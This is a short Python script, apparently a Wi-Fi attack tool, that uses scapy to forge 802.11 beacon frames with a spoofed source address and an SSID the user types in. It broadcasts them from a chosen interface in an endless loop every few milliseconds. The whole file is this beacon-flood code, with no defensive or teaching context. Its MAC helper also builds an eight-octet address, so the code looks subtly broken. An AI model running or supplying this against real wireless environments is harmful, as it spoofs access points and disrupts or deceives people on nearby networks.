from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump
import sys
import re

def hex_to_mac(hex_val):
    v = hex_val
    s = '{0:016x}'.format(v)
    s = ':'.join(re.findall(r'\w\w', s))
    return s

def beacon_flood(dev):
    hex_val = 0x000e96a001064d60
    SSID = bytes(input("SSID: "),'utf-8')
    addr = hex_to_mac(hex_val)
    
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=addr, addr3=addr)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=SSID, len=len(SSID))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, iface=dev, inter=0.004, loop=1)

beacon_flood(sys.argv[1])


